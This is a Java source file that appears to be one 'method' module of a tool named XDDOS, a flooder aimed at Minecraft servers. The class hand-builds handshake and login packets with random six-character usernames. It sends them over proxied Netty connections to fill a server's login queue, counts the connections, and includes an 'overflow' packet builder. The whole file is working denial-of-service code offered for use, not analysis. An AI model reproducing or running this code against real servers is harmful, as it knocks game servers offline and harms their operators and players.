package XD.XDDOS.methods;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.PacketUtils;
import XD.XDDOS.utils.RandomUtils;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.awt.Color;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Random;
import java.util.zip.Deflater;

public class queue implements Method {
  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);

  private byte[] bytes = this.handshake.getWrappedPacket();

  public static byte[] createoverflowPacket() throws IOException {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    DataOutputStream out = new DataOutputStream(bytes);
    PacketUtils.writeVarInt(out, 0);
    Random randomGenerator = new Random();
    int red = randomGenerator.nextInt(256);
    int green = randomGenerator.nextInt(256);
    int blue = randomGenerator.nextInt(256);
    Color randomColour = new Color(red, green, blue);
    PacketUtils.writeString(out, "" + randomColour + randomColour);
    byte[] data = bytes.toByteArray();
    bytes.close();
    return data;
  }

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    try {
      bbbb.write(15);
      bbbb.write(0);
      bbbb.write(47);
      bbbb.write(9);
      bbbb.writeBytes("localhost");
      bbbb.write(99);
      bbbb.write(223);
      bbbb.write(2);
      String var3 = RandomUtils.randomString(6);
      bbbb.write(var3.length() + 2);
      bbbb.write(0);
      bbbb.write(var3.length());
      bbbb.writeBytes(var3);
      bbbb.close();
    } catch (IOException ioException) {
      ioException.printStackTrace();
    }
    channel.writeAndFlush(b);
    channel.writeAndFlush(bbbb);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }

  public byte[] compress(byte[] packet, int threshold) throws IOException {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    DataOutputStream out = new DataOutputStream(bytes);
    byte[] buffer = new byte[8192];
    if (packet.length >= threshold && threshold > 0) {
      byte[] data = new byte[packet.length];
      System.arraycopy(packet, 0, data, 0, packet.length);
      PacketUtils.writeVarInt(out, data.length);
      Deflater def = new Deflater();
      def.setInput(data, 0, data.length);
      def.finish();
      while (!def.finished()) {
        int i = def.deflate(buffer);
        out.write(buffer, 0, i);
      }
      def.reset();
    } else {
      PacketUtils.writeVarInt(out, 0);
      out.write(packet);
    }
    out.close();
    return bytes.toByteArray();
  }

  public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
    writeVarInt(packetData.length, out);
    out.write(packetData);
  }

  public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
    while ((value & 0xFFFFFF80) != 0) {
      out.writeByte(value & 0x7F | 0x80);
      value >>>= 7;
    }
    out.writeByte(value);
  }
}
